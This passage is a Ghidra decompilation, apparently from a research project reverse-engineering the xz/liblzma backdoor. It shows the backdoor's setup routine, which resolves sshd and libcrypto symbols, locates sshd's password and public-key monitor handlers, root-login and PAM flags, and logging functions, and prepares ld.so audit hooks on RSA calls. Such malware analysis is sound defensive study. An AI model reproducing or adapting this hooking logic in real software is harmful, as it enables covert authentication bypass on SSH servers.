// /home/kali/xzre-ghidra/xzregh/105830_backdoor_setup.c
// Function: backdoor_setup @ 0x105830
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_setup(backdoor_setup_params_t * params)


/*
 * AutoDoc: The loader’s main workhorse. It snapshots the caller’s GOT/stack, builds a local
 * `backdoor_data_t` describing all observed modules, resolves sshd/libcrypto/liblzma/libc/ld.so
 * via `process_shared_libraries`, initialises the shared globals, and pulls in the
 * `backdoor_hooks_data_t` blob sitting inside liblzma. With those pieces it refreshes the
 * string-reference catalogue, configures the global context (payload buffers, sshd/log contexts,
 * import tables), runs the sensitive-data + sshd-metadata discovery routines, and finally rewires
 * ld.so’s audit tables so `backdoor_symbind64` is invoked for every sshd→libcrypto PLT call. On
 * success it copies the updated hook table back into liblzma and leaves the cpuid GOT slot ready
 * to resume execution.
 */
#include "xzre_types.h"


BOOL backdoor_setup(backdoor_setup_params_t *params)

{
  global_context_t *ctx;
  imported_funcs_t *imported_funcs;
  u32 *puVar1;
  audit_ifaces *paVar2;
  elf_handles_t *peVar3;
  uint uVar4;
  u32 uVar5;
  u64 *puVar6;
  u64 *puVar7;
  backdoor_hooks_ctx_t *pbVar8;
  backdoor_hooks_data_t **ppbVar9;
  u64 uVar10;
  pfn_RSA_get0_key_t ppVar11;
  pfn_EVP_PKEY_set1_RSA_t ppVar12;
  sshd_monitor_func_t psVar13;
  elf_symbol_get_addr_fn peVar14;
  Elf64_Addr EVar15;
  Elf64_Ehdr *pEVar16;
  sshd_ctx_t *psVar17;
  byte *pbVar18;
  undefined4 *puVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  BOOL bVar23;
  elf_info_t *elf_info;
  byte bVar24;
  EncodedStringId EVar25;
  BOOL BVar26;
  void *pvVar27;
  lzma_allocator *plVar28;
  pfn_malloc_usable_size_t ppVar29;
  lzma_allocator *plVar30;
  elf_info_t *peVar31;
  pfn_EVP_MD_CTX_new_t ppVar32;
  void *pvVar33;
  elf_functions_t *peVar34;
  pfn_BN_free_t ppVar35;
  Elf64_Sym *pEVar36;
  char *pcVar37;
  pfn_BN_bn2bin_t ppVar38;
  Elf64_Sym *pEVar39;
  Elf64_Sym *pEVar40;
  pfn_RSA_set0_key_t ppVar41;
  Elf64_Sym *pEVar42;
  Elf64_Rela *mem_address;
  int *piVar43;
  u8 *puVar44;
  long lVar45;
  u8 *puVar46;
  Elf64_Ehdr *string_begin;
  u8 *puVar47;
  backdoor_data_t *pbVar48;
  elf_entry_ctx_t *peVar49;
  global_context_t *pgVar50;
  backdoor_hooks_data_t *pbVar51;
  sshd_ctx_t *psVar52;
  sshd_log_ctx_t *psVar53;
  imported_funcs_t *piVar54;
  u8 *puVar55;
  dasm_ctx_t *pdVar56;
  audit_ifaces *paVar57;
  undefined1 uVar58;
  undefined1 uVar59;
  u8 *puVar60;
  sshd_monitor_func_t *code_start;
  int iVar61;
  byte bVar62;
  string_references_t string_refs;
  backdoor_shared_libraries_data_t shared_maps;
  backdoor_data_t backdoor_data;
  backdoor_hooks_data_t *hooks;
  global_context_t *global_ctx;
  u8 *local_b48;
  u8 *local_b20;
  backdoor_hooks_data_t *local_b10;
  EncodedStringId local_acc;
  ptrdiff_t local_ac8;
  pfn_RSA_public_decrypt_t *local_ac0;
  pfn_EVP_PKEY_set1_RSA_t *local_ab8;
  pfn_RSA_get0_key_t *local_ab0;
  void *local_aa8;
  u64 local_aa0;
  u64 local_a98;
  u64 local_a90;
  main_elf_t local_a88;
  u64 *local_a70;
  backdoor_shared_libraries_data_t local_a68;
  dasm_ctx_t local_a30;
  dasm_ctx_t local_9d8;
  backdoor_data_t local_980;
  
  bVar62 = 0;
  local_acc = 0;
  pbVar48 = &local_980;
  for (lVar45 = 0x256; lVar45 != 0; lVar45 = lVar45 + -1) {
    *(undefined4 *)&pbVar48->main_map = 0;
    pbVar48 = (backdoor_data_t *)((long)&pbVar48->main_map + 4);
  }
  peVar3 = &local_980.elf_handles;
  local_980.elf_handles.dynamic_linker = &local_980.dynamic_linker_info;
  local_980.elf_handles.libc = &local_980.libc_info;
  local_ac8 = 0;
  local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
  local_ab8 = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
  local_ab0 = (pfn_RSA_get0_key_t *)0x0;
  local_aa8 = (void *)0x0;
  peVar49 = params->entry_ctx;
  local_980.elf_handles.liblzma = &local_980.liblzma_info;
  local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
  local_980.elf_handles.main = &local_980.main_info;
  local_980.data_handle.data = &local_980;
  local_980.data_handle.elf_handles = peVar3;
  update_got_address(peVar49);
  pvVar27 = (peVar49->got_ctx).got_ptr;
  if (pvVar27 != (void *)0x0) {
    puVar6 = *(u64 **)((long)pvVar27 + (long)(peVar49->got_ctx).cpuid_fn * 8 + 0x18);
    puVar7 = peVar49->frame_address;
    lVar45 = (long)puVar7 - (long)puVar6;
    if (puVar7 <= puVar6) {
      lVar45 = (long)puVar6 - (long)puVar7;
    }
    if (lVar45 < 0x50001) {
      string_begin = (Elf64_Ehdr *)((ulong)puVar6 & 0xfffffffffffff000);
      pEVar16 = string_begin + -0x800;
LAB_00105951:
      EVar25 = get_string_id((char *)string_begin,(char *)0x0);
      if (EVar25 != STR_ELF) goto code_r0x00105962;
      local_a88.__libc_stack_end = &local_aa8;
      local_a70 = params->entry_ctx->frame_address;
      local_a88.elf_handles = peVar3;
      local_a88.dynamic_linker_ehdr = string_begin;
      BVar26 = main_elf_parse(&local_a88);
      if (BVar26 != FALSE) {
        local_980.import_resolver = get_lzma_allocator();
        lVar45 = 0;
        do {
          *(undefined1 *)((long)&local_980.fake_allocator.alloc + lVar45) =
               *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar45);
          lVar45 = lVar45 + 1;
        } while (lVar45 != 0x18);
        local_a68.RSA_public_decrypt_plt = &local_ac0;
        local_a68.EVP_PKEY_set1_RSA_plt = &local_ab8;
        local_a68.RSA_get0_key_plt = &local_ab0;
        local_a68.hooks_data_addr = params->hook_params->hooks_data_addr;
        local_a68.data = &local_980;
        local_a68.elf_handles = peVar3;
        local_a68.libc_imports = &local_980.libc_imports;
        BVar26 = process_shared_libraries(&local_a68);
        if (BVar26 == FALSE) goto LAB_00105a59;
        local_b10 = *params->hook_params->hooks_data_addr;
        ctx = &local_b10->global_ctx;
        imported_funcs = &local_b10->imported_funcs;
        pgVar50 = ctx;
        for (lVar45 = 0x5a; lVar45 != 0; lVar45 = lVar45 + -1) {
          pgVar50->uses_endbr64 = FALSE;
          pgVar50 = (global_context_t *)((long)pgVar50 + (ulong)bVar62 * -8 + 4);
        }
        (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
        pbVar8 = params->hook_params;
        (local_b10->global_ctx).imported_funcs = imported_funcs;
        (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
        ppbVar9 = pbVar8->hooks_data_addr;
        (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
        pbVar51 = *ppbVar9;
        uVar10 = pbVar51->signed_data_size;
        (local_b10->global_ctx).current_data_size = 0;
        (local_b10->global_ctx).payload_data = &pbVar51->signed_data;
        (local_b10->global_ctx).payload_data_size = uVar10;
        elf_find_string_references(&local_980.main_info,&local_980.string_refs);
        local_aa0 = 0;
        pvVar27 = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
        if (pvVar27 != (void *)0x0) {
          (local_b10->global_ctx).lzma_code_start = pvVar27;
          (local_b10->global_ctx).lzma_code_end = (void *)((long)pvVar27 + local_aa0);
          pbVar51 = local_b10;
          for (lVar45 = 0x4e; lVar45 != 0; lVar45 = lVar45 + -1) {
            (pbVar51->ldso_ctx)._unknown1459[0] = '\0';
            (pbVar51->ldso_ctx)._unknown1459[1] = '\0';
            (pbVar51->ldso_ctx)._unknown1459[2] = '\0';
            (pbVar51->ldso_ctx)._unknown1459[3] = '\0';
            pbVar51 = (backdoor_hooks_data_t *)((long)pbVar51 + (ulong)bVar62 * -8 + 4);
          }
          pbVar8 = params->hook_params;
          (local_b10->ldso_ctx).imported_funcs = imported_funcs;
          ppVar11 = pbVar8->hook_RSA_get0_key;
          (local_b10->ldso_ctx).hook_RSA_public_decrypt = pbVar8->hook_RSA_public_decrypt;
          ppVar12 = params->shared->hook_EVP_PKEY_set1_RSA;
          (local_b10->ldso_ctx).hook_RSA_get0_key = ppVar11;
          (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = ppVar12;
          psVar52 = &local_b10->sshd_ctx;
          for (lVar45 = 0x38; lVar45 != 0; lVar45 = lVar45 + -1) {
            psVar52->have_mm_answer_keyallowed = FALSE;
            psVar52 = (sshd_ctx_t *)((long)psVar52 + (ulong)bVar62 * -8 + 4);
          }
          (local_b10->sshd_ctx).mm_answer_authpassword_hook =
               params->shared->mm_answer_authpassword_hook;
          psVar13 = params->hook_params->mm_answer_keyverify;
          (local_b10->sshd_ctx).mm_answer_keyallowed = params->hook_params->mm_answer_keyallowed;
          (local_b10->sshd_ctx).mm_answer_keyverify = psVar13;
          psVar53 = &local_b10->sshd_log_ctx;
          for (lVar45 = 0x1a; lVar45 != 0; lVar45 = lVar45 + -1) {
            psVar53->logging_disabled = FALSE;
            psVar53 = (sshd_log_ctx_t *)((long)psVar53 + (ulong)bVar62 * -8 + 4);
          }
          (local_b10->sshd_log_ctx).mm_log_handler = params->hook_params->mm_log_handler;
          *params->shared->globals = ctx;
          piVar54 = imported_funcs;
          for (lVar45 = 0x4a; lVar45 != 0; lVar45 = lVar45 + -1) {
            *(undefined4 *)&piVar54->RSA_public_decrypt = 0;
            piVar54 = (imported_funcs_t *)((long)piVar54 + (ulong)bVar62 * -8 + 4);
          }
          (local_b10->imported_funcs).RSA_public_decrypt_plt = local_ac0;
          (local_b10->imported_funcs).EVP_PKEY_set1_RSA_plt = local_ab8;
          (local_b10->imported_funcs).RSA_get0_key_plt = local_ab0;
          lVar45 = 0;
          do {
            (local_b10->libc_imports)._unknown993[lVar45 + -4] =
                 local_980.libc_imports._unknown993[lVar45 + -4];
            lVar45 = lVar45 + 1;
          } while (lVar45 != 0x70);
          (local_b10->imported_funcs).libc = &local_b10->libc_imports;
          (local_b10->libc_imports).__libc_stack_end = local_aa8;
          plVar28 = get_lzma_allocator();
          plVar28->opaque = local_980.elf_handles.libc;
          ppVar29 = (pfn_malloc_usable_size_t)lzma_alloc(0x440,plVar28);
          (local_b10->libc_imports).malloc_usable_size = ppVar29;
          if (ppVar29 != (pfn_malloc_usable_size_t)0x0) {
            (local_b10->libc_imports).resolved_imports_count =
                 (local_b10->libc_imports).resolved_imports_count + 1;
          }
          BVar26 = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
          ;
          if (BVar26 == FALSE) goto LAB_00105a60;
          plVar30 = get_lzma_allocator();
          plVar30->opaque = local_980.elf_handles.libcrypto;
          peVar31 = local_980.elf_handles.libcrypto;
          if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
            peVar31 = (elf_info_t *)
                      elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
            ppVar32 = (pfn_EVP_MD_CTX_new_t)lzma_alloc(0xaf8,plVar30);
            (local_b10->imported_funcs).EVP_MD_CTX_new = ppVar32;
            if (ppVar32 != (pfn_EVP_MD_CTX_new_t)0x0) {
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
            }
          }
          elf_info = local_980.elf_handles.main;
          local_a30.instruction = (u8 *)0x0;
          local_9d8.instruction = (u8 *)0x0;
          pvVar27 = elf_get_code_segment(local_980.elf_handles.main,(u64 *)&local_a30);
          puVar60 = local_a30.instruction + (long)pvVar27;
          pvVar33 = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
          (local_b10->global_ctx).sshd_code_start = pvVar27;
          (local_b10->global_ctx).sshd_code_end = puVar60;
          (local_b10->global_ctx).sshd_data_start = pvVar33;
          (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)pvVar33;
          peVar34 = get_elf_functions_address();
          if (((peVar34 == (elf_functions_t *)0x0) ||
              (peVar14 = peVar34->elf_symbol_get_addr, peVar14 == (elf_symbol_get_addr_fn)0x0)) ||
             (peVar34->elf_parse == (elf_parse_fn)0x0)) goto LAB_00105a60;
          pEVar36 = (Elf64_Sym *)0x0;
          ppVar35 = (pfn_BN_free_t)(*peVar14)(local_980.elf_handles.libcrypto,STR_BN_free);
          (local_b10->imported_funcs).BN_free = ppVar35;
          if (ppVar35 != (pfn_BN_free_t)0x0) {
            pEVar36 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
          }
          local_acc = STR_ssh_rsa_cert_v01_openssh_com;
          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
          (local_b10->global_ctx).STR_ssh_rsa_cert_v01_openssh_com = pcVar37;
          if (pcVar37 == (char *)0x0) goto LAB_00105a60;
          local_acc = STR_rsa_sha2_256;
          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
          (local_b10->global_ctx).STR_rsa_sha2_256 = pcVar37;
          if (pcVar37 == (char *)0x0) goto LAB_00105a60;
          pEVar39 = (Elf64_Sym *)0x0;
          ppVar38 = (pfn_BN_bn2bin_t)
                    elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
          (local_b10->imported_funcs).BN_bn2bin = ppVar38;
          if (ppVar38 != (pfn_BN_bn2bin_t)0x0) {
            pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
            if (pEVar39 != (Elf64_Sym *)0x0) {
              EVar15 = pEVar39->st_value;
              pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
              (local_b10->imported_funcs).BN_dup = (pfn_BN_dup_t)(pEVar16->e_ident + EVar15);
            }
            pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
            if ((local_b10->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
            }
          }
          pEVar40 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
          ppVar41 = (pfn_RSA_set0_key_t)(*peVar14)(local_980.elf_handles.libcrypto,STR_RSA_set0_key)
          ;
          pEVar42 = (Elf64_Sym *)0x0;
          (local_b10->imported_funcs).RSA_set0_key = ppVar41;
          if (ppVar41 != (pfn_RSA_set0_key_t)0x0) {
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            pEVar42 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
            if (peVar31 != (elf_info_t *)0x0) {
              EVar15 = peVar31->first_vaddr;
              pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
              (local_b10->imported_funcs).RSA_get0_key =
                   (pfn_RSA_get0_key_t)(pEVar16->e_ident + EVar15);
            }
          }
          if ((local_b10->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
          }
          BVar26 = sshd_find_sensitive_data
                             (local_980.elf_handles.main,local_980.elf_handles.libcrypto,
                              &local_980.string_refs,imported_funcs,ctx);
          if (BVar26 == FALSE) goto LAB_00105a60;
          if (pEVar36 != (Elf64_Sym *)0x0) {
            EVar15 = pEVar36->st_value;
            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(pEVar16->e_ident + EVar15);
          }
          if (pEVar39 != (Elf64_Sym *)0x0) {
            EVar15 = pEVar39->st_value;
            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).RSA_new = (pfn_RSA_new_t)(pEVar16->e_ident + EVar15);
          }
          if (pEVar40 != (Elf64_Sym *)0x0) {
            EVar15 = pEVar40->st_value;
            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).RSA_free = (pfn_RSA_free_t)(pEVar16->e_ident + EVar15);
          }
          if (pEVar42 != (Elf64_Sym *)0x0) {
            EVar15 = pEVar42->st_value;
            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(pEVar16->e_ident + EVar15);
          }
          pEVar36 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
          peVar31 = local_980.elf_handles.main;
          psVar52 = (local_b10->global_ctx).sshd_ctx;
          local_a30.instruction = (u8 *)0x0;
          local_a98 = local_a98 & 0xffffffff00000000;
          psVar52->have_mm_answer_keyallowed = FALSE;
          psVar52->have_mm_answer_authpassword = FALSE;
          psVar52->have_mm_answer_keyverify = FALSE;
          pvVar27 = elf_get_data_segment(local_980.elf_handles.main,(u64 *)&local_a30,FALSE);
          puVar60 = local_a30.instruction;
          if ((pvVar27 != (void *)0x0) &&
             (local_980.string_refs.entries[0x12].func_start != (void *)0x0)) {
            psVar52->mm_request_send_start = local_980.string_refs.entries[0x12].func_start;
            psVar52->mm_request_send_end = local_980.string_refs.entries[0x12].func_end;
            local_a98 = CONCAT44(local_a98._4_4_,0x400);
            pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a98,(void *)0x0);
            psVar52->STR_without_password = pcVar37;
            if ((pcVar37 != (char *)0x0) &&
               (BVar26 = elf_find_function_pointer
                                   (XREF_mm_answer_authpassword,
                                    &psVar52->mm_answer_authpassword_start,
                                    &psVar52->mm_answer_authpassword_end,
                                    &psVar52->mm_answer_authpassword_ptr,peVar31,
                                    &local_980.string_refs,ctx), BVar26 == FALSE)) {
              psVar52->mm_answer_authpassword_start = (void *)0x0;
              psVar52->mm_answer_authpassword_end = (void *)0x0;
              psVar52->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
            }
            local_a98 = CONCAT44(local_a98._4_4_,0x7b8);
            pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a98,(void *)0x0);
            psVar52->STR_publickey = pcVar37;
            if (pcVar37 != (char *)0x0) {
              BVar26 = elf_find_function_pointer
                                 (XREF_mm_answer_keyallowed,&psVar52->mm_answer_keyallowed_start,
                                  &psVar52->mm_answer_keyallowed_end,
                                  &psVar52->mm_answer_keyallowed_ptr,peVar31,&local_980.string_refs,
                                  ctx);
              if (BVar26 == FALSE) {
                psVar52->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                psVar52->mm_answer_keyallowed_end = (void *)0x0;
                psVar52->mm_answer_keyallowed_ptr = (void *)0x0;
              }
              else {
                BVar26 = elf_find_function_pointer
                                   (XREF_mm_answer_keyverify,&psVar52->mm_answer_keyverify_start,
                                    &psVar52->mm_answer_keyverify_end,
                                    &psVar52->mm_answer_keyverify_ptr,peVar31,&local_980.string_refs
                                    ,ctx);
                if (BVar26 == FALSE) {
                  psVar52->mm_answer_keyverify_start = (void *)0x0;
                  psVar52->mm_answer_keyverify_end = (void *)0x0;
                  psVar52->mm_answer_keyverify_ptr = (void *)0x0;
                }
              }
            }
            if ((psVar52->mm_answer_authpassword_start != (void *)0x0) ||
               (psVar52->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
              psVar17 = (local_b10->global_ctx).sshd_ctx;
              local_9d8.instruction = (u8 *)0x0;
              code_start = (sshd_monitor_func_t *)psVar17->mm_answer_authpassword_start;
              if (code_start == (sshd_monitor_func_t *)0x0) {
                code_start = psVar17->mm_answer_keyallowed_start;
                if (code_start == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
                puVar47 = (u8 *)psVar17->mm_answer_keyallowed_end;
              }
              else {
                puVar47 = (u8 *)psVar17->mm_answer_authpassword_end;
              }
              bVar23 = FALSE;
              pcVar37 = (char *)0x0;
              local_a90 = CONCAT44(local_a90._4_4_,0x198);
              while (pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a90,pcVar37),
                    pcVar37 != (char *)0x0) {
                local_9d8.instruction = (u8 *)0x0;
                EVar25 = (EncodedStringId)pcVar37;
                mem_address = elf_find_rela_reloc(peVar31,EVar25,0);
                if (mem_address == (Elf64_Rela *)0x0) {
                  local_9d8.instruction = (u8 *)0x0;
                  bVar23 = TRUE;
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
                }
                while (mem_address != (Elf64_Rela *)0x0) {
                  do {
                    BVar26 = elf_contains_vaddr_relro(peVar31,(u64)mem_address,8,1);
                    if ((BVar26 != FALSE) &&
                       (BVar26 = find_instruction_with_mem_operand_ex
                                           ((u8 *)code_start,puVar47,(dasm_ctx_t *)0x0,0x109,
                                            mem_address), BVar26 != FALSE)) {
                      pvVar33 = psVar52->mm_answer_authpassword_start;
                      ((local_b10->global_ctx).sshd_ctx)->STR_unknown_ptr = (char *)mem_address;
                      if (pvVar33 != (void *)0x0) {
                        psVar52->have_mm_answer_authpassword = TRUE;
                      }
                      if ((psVar52->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
                         (psVar52->have_mm_answer_keyallowed = TRUE,
                         psVar52->mm_answer_keyverify_start != (void *)0x0)) {
                        psVar52->have_mm_answer_keyverify = TRUE;
                      }
                      piVar43 = (int *)find_addr_referenced_in_mov_instruction
                                                 (XREF_start_pam,&local_980.string_refs,pvVar27,
                                                  puVar60 + (long)pvVar27);
                      if (piVar43 != (int *)0x0) {
                        ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = piVar43;
                      }
                      pdVar56 = &local_9d8;
                      bVar23 = FALSE;
                      local_9d8.instruction_size._0_4_ = 0x70;
                      local_9d8.instruction = (u8 *)0xc5800000948;
                      goto LAB_00106471;
                    }
                    if (bVar23) goto LAB_001063c8;
                    mem_address = elf_find_rela_reloc(peVar31,EVar25,0);
                  } while (mem_address != (Elf64_Rela *)0x0);
                  local_9d8.instruction = (u8 *)0x0;
LAB_001063c8:
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
                  bVar23 = TRUE;
                }
                pcVar37 = pcVar37 + 8;
              }
            }
          }
          goto LAB_001065af;
        }
        goto LAB_00105a60;
      }
    }
  }
LAB_00105a59:
  local_b10 = (backdoor_hooks_data_t *)0x0;
  goto LAB_00105a60;
code_r0x00105962:
  string_begin = string_begin + -0x40;
  if (string_begin == pEVar16) goto LAB_00105a59;
  goto LAB_00105951;
LAB_00106471:
  do {
    pcVar37 = elf_find_string(peVar31,(EncodedStringId *)pdVar56,(void *)0x0);
    if (pcVar37 != (char *)0x0) {
      if (bVar23) {
        ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
        goto LAB_001064b8;
      }
      bVar23 = TRUE;
    }
    pdVar56 = (dasm_ctx_t *)((long)&pdVar56->instruction + 4);
  } while (pdVar56 != (dasm_ctx_t *)((long)&local_9d8.instruction_size + 4));
  ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
LAB_001064b8:
  piVar43 = (int *)find_addr_referenced_in_mov_instruction
                             (XREF_auth_root_allowed,&local_980.string_refs,pvVar27,
                              puVar60 + (long)pvVar27);
  if (piVar43 != (int *)0x0) {
    if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
       ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
      iVar61 = 0;
      lVar45 = 0;
      local_9d8.instruction_size._0_4_ = 0x10;
      local_9d8.instruction = (u8 *)0xf0000000e;
      hooks = (backdoor_hooks_data_t *)0x0;
      do {
        puVar60 = (u8 *)local_980.string_refs.entries
                        [*(uint *)(local_9d8.opcode_window + lVar45 * 4 + -0x25)].func_start;
        if (puVar60 != (u8 *)0x0) {
          puVar47 = (u8 *)local_980.string_refs.entries
                          [*(uint *)(local_9d8.opcode_window + lVar45 * 4 + -0x25)].func_end;
          iVar61 = iVar61 + 1;
          BVar26 = find_instruction_with_mem_operand(puVar60,puVar47,(dasm_ctx_t *)0x0,piVar43);
          if ((BVar26 != FALSE) ||
             (BVar26 = find_add_instruction_with_mem_operand
                                 (puVar60,puVar47,(dasm_ctx_t *)0x0,piVar43), BVar26 != FALSE)) {
            hooks = (backdoor_hooks_data_t *)(ulong)((int)hooks + 1);
          }
        }
        lVar45 = lVar45 + 1;
      } while (lVar45 != 3);
      if ((iVar61 != 0) && ((int)hooks == 0)) goto LAB_001065af;
    }
    ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = piVar43;
  }
LAB_001065af:
  pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
  BVar26 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.string_refs,ctx);
  if (BVar26 == FALSE) {
    (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
    (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
  }
  psVar53 = (local_b10->global_ctx).sshd_log_ctx;
  plVar28->opaque = local_980.elf_handles.libc;
  local_a98 = 0;
  psVar53->logging_disabled = FALSE;
  psVar53->log_hooking_possible = FALSE;
  pvVar27 = elf_get_code_segment(&local_980.main_info,&local_a98);
  uVar10 = local_a98;
  if ((((pvVar27 != (void *)0x0) && (0x10 < local_a98)) &&
      ((u8 *)local_980.string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
     (((local_b10->global_ctx).uses_endbr64 == FALSE ||
      (BVar26 = is_endbr64_instruction
                          ((u8 *)local_980.string_refs.entries[0x19].func_start,
                           (u8 *)((long)local_980.string_refs.entries[0x19].func_start + 4),0xe230),
      BVar26 != FALSE)))) {
    psVar53->sshlogv = local_980.string_refs.entries[0x19].func_start;
    pdVar56 = &local_a30;
    for (lVar45 = 0x16; lVar45 != 0; lVar45 = lVar45 + -1) {
      *(undefined4 *)&pdVar56->instruction = 0;
      pdVar56 = (dasm_ctx_t *)((long)pdVar56 + (ulong)bVar62 * -8 + 4);
    }
    if ((u8 *)local_980.string_refs.entries[0x1a].func_start != (u8 *)0x0) {
      local_b48 = (u8 *)local_980.string_refs.entries[0x1a].func_start;
      local_b20 = (u8 *)0x0;
      puVar60 = (u8 *)0x0;
      do {
        while( TRUE ) {
          if ((local_980.string_refs.entries[0x1a].func_end <= local_b48) ||
             ((local_b20 != (u8 *)0x0 && (puVar60 != (u8 *)0x0)))) goto LAB_00106bf0;
          BVar26 = x86_dasm(&local_a30,local_b48,(u8 *)local_980.string_refs.entries[0x1a].func_end)
          ;
          if (BVar26 != FALSE) break;
          local_b48 = local_b48 + 1;
        }
        if ((local_a30._40_4_ & 0xfffffffd) == 0xb1) {
          if (local_a30.prefix.decoded.modrm.breakdown.modrm_mod != '\x03') goto LAB_00106735;
          if ((local_a30.prefix.flags_u16 & 0x1040) == 0) {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              bVar24 = 0;
LAB_001067cf:
              uVar59 = local_a30.prefix.decoded.modrm.breakdown.modrm_rm;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                uVar59 = local_a30.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
              }
              goto LAB_001067ed;
            }
            uVar59 = 0;
          }
          else {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              bVar24 = local_a30.prefix.decoded.modrm.breakdown.modrm_reg;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                bVar24 = bVar24 | (char)local_a30.prefix.decoded.rex * '\x02' & 8U;
              }
              goto LAB_001067cf;
            }
            uVar59 = local_a30.prefix.decoded.flags2 & 0x10;
            if ((local_a30.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
            bVar24 = local_a30.imm64_reg;
            if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
              bVar24 = local_a30.imm64_reg | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
            }
            uVar59 = 0;
LAB_001067ed:
            if (bVar24 != uVar59) goto LAB_00106735;
          }
LAB_001067fb:
          uVar58 = 0;
          uVar4 = 0;
          puVar60 = (u8 *)0x0;
          pdVar56 = &local_9d8;
          for (lVar45 = 0x16; lVar45 != 0; lVar45 = lVar45 + -1) {
            *(undefined4 *)&pdVar56->instruction = 0;
            pdVar56 = (dasm_ctx_t *)((long)pdVar56 + (ulong)bVar62 * -8 + 4);
          }
          puVar47 = (u8 *)0x0;
          puVar55 = local_b48;
          for (; (puVar55 < local_980.string_refs.entries[0x1a].func_end && (uVar4 < 5));
              uVar4 = uVar4 + 1) {
            if ((puVar47 != (u8 *)0x0) && (puVar60 != (u8 *)0x0)) goto LAB_00106b3c;
            BVar26 = find_mov_instruction
                               (puVar55,(u8 *)local_980.string_refs.entries[0x1a].func_end,TRUE,
                                FALSE,&local_9d8);
            if (BVar26 == FALSE) break;
            if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
              if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
                uVar58 = local_9d8.prefix.decoded.flags2 & 0x10;
